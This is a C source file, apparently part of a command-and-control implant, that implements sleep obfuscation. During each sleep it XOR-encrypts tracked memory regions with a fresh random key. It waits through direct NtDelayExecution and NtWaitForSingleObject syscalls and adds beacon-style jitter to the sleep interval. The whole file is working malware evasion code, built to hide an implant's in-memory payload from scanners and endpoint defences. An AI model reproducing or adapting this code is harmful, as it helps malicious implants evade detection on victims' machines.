#include "WaitMask.h"
#include "Syscalls.h"
#include "ApiLoader.h"

#define MAX_SLEEP_REGIONS 128
#define SLEEP_KEY_SIZE    32
static PVOID g_SleepRegions[MAX_SLEEP_REGIONS];
static SIZE_T g_SleepRegionSizes[MAX_SLEEP_REGIONS];
static int g_SleepRegionCount = 0;
static BYTE g_XorKey[SLEEP_KEY_SIZE];

static void RefreshSleepKey()
{
	for (int i = 0; i < SLEEP_KEY_SIZE; i++) {
		g_XorKey[i] = (BYTE)(GenerateRandom32() & 0xFF);
		if (g_XorKey[i] == 0) g_XorKey[i] = (BYTE)(0xAA ^ (BYTE)i);
	}
}

void SleepObfInit()
{
	RefreshSleepKey();
}

void SleepObfTrackRegion(PVOID addr, SIZE_T size)
{
	if (g_SleepRegionCount < MAX_SLEEP_REGIONS) {
		g_SleepRegions[g_SleepRegionCount] = addr;
		g_SleepRegionSizes[g_SleepRegionCount] = size;
		g_SleepRegionCount++;
	}
}

static void SleepEncrypt()
{
	for (int i = 0; i < g_SleepRegionCount; i++) {
		PBYTE p = (PBYTE)g_SleepRegions[i];
		SIZE_T sz = g_SleepRegionSizes[i];
		for (SIZE_T j = 0; j < sz; j++)
			p[j] ^= g_XorKey[j % SLEEP_KEY_SIZE];
	}
}

static void SleepDecrypt()
{
	SleepEncrypt();
}

void mySleep(ULONG ms)
{
	if (ms == 0) return;
	RefreshSleepKey();
	SleepEncrypt();
	LARGE_INTEGER delay;
	delay.QuadPart = -(LONGLONG)(ms * 10000);
	NtDelayExecution_SYSCALL(FALSE, &delay);
	SleepDecrypt();
}

void WaitMask(ULONG worktime, ULONG sleepTime, ULONG jitter) 
{
	ULONG maxSleepTime = 0;
	if (worktime) {
		maxSleepTime = worktime * 1000;
	}
	else if (sleepTime) {
		maxSleepTime = sleepTime * 1000;
		if (jitter) {
			ULONG baseMs = maxSleepTime;
			ULONG halfRange = baseMs * jitter / 200;
			if (halfRange) {
				ULONG delta = GenerateRandom32() % (halfRange + 1);
				if (GenerateRandom32() & 1)
					maxSleepTime += delta;
				else
					maxSleepTime -= delta;
			}
		}
	}
	mySleep(maxSleepTime);
}

void WaitMaskWithEvent(HANDLE hEvent, ULONG worktime, ULONG sleepTime, ULONG jitter)
{
	ULONG maxSleepTime = 0;
	if (worktime) {
		maxSleepTime = worktime * 1000;
	}
	else if (sleepTime) {
		maxSleepTime = sleepTime * 1000;
		if (jitter) {
			ULONG baseMs = maxSleepTime;
			ULONG halfRange = baseMs * jitter / 200;
			if (halfRange) {
				ULONG delta = GenerateRandom32() % (halfRange + 1);
				if (GenerateRandom32() & 1)
					maxSleepTime += delta;
				else
					maxSleepTime -= delta;
			}
		}
	}

	if (hEvent) {
		LARGE_INTEGER timeout;
		timeout.QuadPart = -(LONGLONG)(maxSleepTime * 10000);
		RefreshSleepKey();
		SleepEncrypt();
		NTSTATUS status = NtWaitForSingleObject_SYSCALL(hEvent, FALSE, &timeout);
		SleepDecrypt();
		if (status == 0)
			ApiWin->ResetEvent(hEvent);
	}
	else {
		mySleep(maxSleepTime);
	}
}
